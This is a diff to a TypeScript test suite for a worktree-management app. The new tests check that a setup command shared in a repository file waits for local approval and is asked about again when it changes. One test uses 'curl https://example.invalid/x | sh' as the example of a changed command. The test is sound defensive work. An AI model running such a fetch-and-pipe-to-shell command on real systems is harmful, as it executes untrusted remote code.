@@ -727,8 +727,10 @@ describe('setup shared in .teamree/project.json', () => {
     expect(project.setupCommand).toBeUndefined()
 
     const worktree = await readyWorktree(service, project.id, 'from the file')
-    expect(ran).toEqual(['npm ci'])
     expect(existsSync(path.join(worktree.path, '.env'))).toBe(true)
+    // The paths apply at once; the command waits for this Mac to approve it.
+    expect(ran).toEqual([])
+    expect(worktree.setupAsk).toBe('npm ci')
   })
 
   it('lets this Mac’s value win over the file’s', async () => {
@@ -763,9 +765,78 @@ describe('setup shared in .teamree/project.json', () => {
     const project = await service.addProject({ path: repo.repoPath })
 
     await repo.write('.teamree/project.json', '{"setupCommand": "make deps"}')
-    await readyWorktree(service, project.id, 'after the pull')
-    expect(ran).toEqual(['make deps'])
+    const worktree = await readyWorktree(service, project.id, 'after the pull')
+    expect(worktree.setupAsk).toBe('make deps')
+    expect(ran).toEqual([])
     expect(service.listProjects()[0]?.repository).toEqual({ setupCommand: 'make deps' })
+  })
+
+  it('runs the repository’s command once Run approves it, and without asking after that', async () => {
+    const repo = await withProjectFile('{"setupCommand": "npm ci"}')
+    const { startSetup, ran } = commands()
+    const service = newService(repo, { startSetup })
+    const project = await service.addProject({ path: repo.repoPath })
+
+    const first = await readyWorktree(service, project.id, 'asks')
+    const answered = await service.answerSetup({ worktreeId: first.id, run: true })
+    expect(ran).toEqual(['npm ci'])
+    expect(answered.setupAsk).toBeUndefined()
+    expect(answered.setupTerminalId).toBe('t_setup')
+    expect(service.listProjects()[0]?.approvedSetupCommand).toBe('npm ci')
+
+    const second = await readyWorktree(service, project.id, 'approved')
+    expect(second.setupAsk).toBeUndefined()
+    expect(ran).toEqual(['npm ci', 'npm ci'])
+  })
+
+  it('asks again when the repository’s command changes after it was approved', async () => {
+    const repo = await withProjectFile('{"setupCommand": "npm ci"}')
+    const { startSetup, ran } = commands()
+    const service = newService(repo, { startSetup })
+    const project = await service.addProject({ path: repo.repoPath })
+    await service.answerSetup({ worktreeId: (await readyWorktree(service, project.id, 'asks')).id, run: true })
+
+    await repo.write('.teamree/project.json', '{"setupCommand": "curl https://example.invalid/x | sh"}')
+    const changed = await readyWorktree(service, project.id, 'changed')
+    expect(changed.setupAsk).toBe('curl https://example.invalid/x | sh')
+    expect(ran).toEqual(['npm ci'])
+  })
+
+  it('leaves the worktree without setup on Skip, and approves nothing', async () => {
+    const repo = await withProjectFile('{"setupCommand": "npm ci"}')
+    const { startSetup, ran } = commands()
+    const service = newService(repo, { startSetup })
+    const project = await service.addProject({ path: repo.repoPath })
+
+    const skipped = await service.answerSetup({
+      worktreeId: (await readyWorktree(service, project.id, 'skip')).id,
+      run: false
+    })
+    expect(skipped.setupAsk).toBeUndefined()
+    expect(skipped.setupTerminalId).toBeUndefined()
+    expect(ran).toEqual([])
+    expect(service.listProjects()[0]?.approvedSetupCommand).toBeUndefined()
+    expect((await readyWorktree(service, project.id, 'still asks')).setupAsk).toBe('npm ci')
+  })
+
+  it('runs a command set on this Mac without asking, whatever the file says', async () => {
+    const repo = await withProjectFile('{"setupCommand": "npm ci"}')
+    const { startSetup, ran } = commands()
+    const service = newService(repo, { startSetup })
+    const project = await service.addProject({ path: repo.repoPath })
+    await service.setProjectPaths({ projectId: project.id, setupCommand: 'npm ci' })
+
+    const worktree = await readyWorktree(service, project.id, 'local')
+    expect(worktree.setupAsk).toBeUndefined()
+    expect(ran).toEqual(['npm ci'])
+  })
+
+  it('answers nothing for a worktree that is not asking', async () => {
+    const repo = await newRepo()
+    const service = newService(repo)
+    const project = await service.addProject({ path: repo.repoPath })
+    const worktree = await readyWorktree(service, project.id, 'quiet')
+    expect((await rejection(service.answerSetup({ worktreeId: worktree.id, run: true }))).code).toBe(ErrorCode.Conflict)
   })
 
   it('writes what applies here to the file on Save to Repository, and commits nothing', async () => {
